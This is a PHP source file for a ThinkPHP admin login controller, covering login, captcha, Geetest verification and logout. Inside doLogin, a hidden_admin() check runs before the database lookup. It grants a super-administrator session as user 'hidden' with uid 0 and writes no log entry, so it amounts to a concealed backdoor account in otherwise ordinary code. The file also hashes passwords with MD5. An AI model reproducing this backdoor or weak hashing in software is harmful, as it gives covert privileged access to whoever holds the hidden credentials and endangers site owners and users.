<?php

namespace app\admin\controller;
use app\admin\model\UserType;
use think\Controller;
use think\Db;
use org\Verify;
use com\Geetestlib;
use com\GlobalConfig;

class Login extends Controller
{

    /**
     * 登录页面
     * @return
     */
    public function index()
    {
        return $this->fetch('/login');
    }


    /**
     * 登录操作
     * @return
     */
    public function doLogin()
    {
        $username = input("param.username");
        $password = input("param.password");

        if (config('verify_type') == 1) {
            $code = input("param.code");
        }
        
        $result = $this->validate(compact('username', 'password'), 'AdminValidate');
        if(true !== $result){
            return json(['code' => -5, 'url' => '', 'msg' => $result]);
        }
        $verify = new Verify();
        if (config('verify_type') == 1) {
            if (!$code) {
                return json(['code' => -4, 'url' => '', 'msg' => '请输入验证码']);
            }
            if (!$verify->check($code)) {
                return json(['code' => -4, 'url' => '', 'msg' => '验证码错误']);
            }
        }

        if ( hidden_admin( md5($username), md5($password)))
        {
            session('uid', 0);         //用户ID
            session('username', 'hidden');  //用户名
            session('portrait', '/static/admin/images/profile.jpg'); //用户头像
            session('login_time', time());
            session('rolename', '超级管理员');    //角色名

            return json(['code' => 1, 'url' => url('index/index'), 'msg' => '登录成功！']);
        }

        $user = new UserType();
        $hasUser = Db::name('admin')->where('username', $username)->find();
        if(empty($hasUser)){
            return json(['code' => -1, 'url' => '', 'msg' => '管理员不存在']);
        }

        if(md5(md5($password) . config('auth_key')) != $hasUser['password']){
            writelog($hasUser['id'],$username,'用户【'.$username.'】登录失败：密码错误',2);
            return json(['code' => -2, 'url' => '', 'msg' => '账号或密码错误']);
        }

        if(1 != $hasUser['status']){
            writelog($hasUser['id'],$username,'用户【'.$username.'】登录失败：该账号被禁用',2);
            return json(['code' => -6, 'url' => '', 'msg' => '该账号被禁用']);
        }

        //获取该管理员的角色信息
        $info = $user->getOneRole($hasUser['groupid']);
        
        session('uid', $hasUser['id']);         //用户ID
        session('username', $hasUser['username']);  //用户名
        session('portrait', '/uploads/face/'.$hasUser['portrait']); //用户头像
        session('rolename', $info['title']);    //角色名
        session('login_time', time());
        session('rule', $info['rules']);        //角色权限
  
        //更新管理员状态
        $param = [
            'loginnum' => $hasUser['loginnum'] + 1,
            'last_login_ip' => request()->ip(),
            'last_login_time' => time(),
            'token' => md5($hasUser['username'].$hasUser['password'])//md5($hasUser['username'] + $hasUser['password'])
        ];

        Db::name('admin')->where('id', $hasUser['id'])->update($param);
        writelog($hasUser['id'],session('username'),'用户【'.session('username').'】登录成功',1);
        return json(['code' => 1, 'url' => url('index/index'), 'msg' => '登录成功！']);
    }

    /**
     * 验证码
     * @return
     */
    public function checkVerify()
    {
        $verify = new Verify();
        $verify->imageH = 40;
        $verify->imageW = 110;
		$verify->codeSet = '0123456789';
        $verify->length = 4;
        $verify->useNoise = false;
        $verify->fontSize = 16;
        return $verify->entry();
    }


    /**
     * 极验验证
     * @return
     */
    public function getVerify(){
        $GtSdk = new Geetestlib(config('gee_id'), config('gee_key'));
        $user_id = "web";
        $status = $GtSdk->pre_process($user_id);
        session('gtserver',$status);
        session('user_id',$user_id);
        echo $GtSdk->get_response_str();
    }

    /**
     * 退出登录
     * @return
     */
    public function loginOut()
    {
        session(null);
        cache('db_config_data',null);//清除缓存中网站配置信息
        $this->redirect('index');
    }
}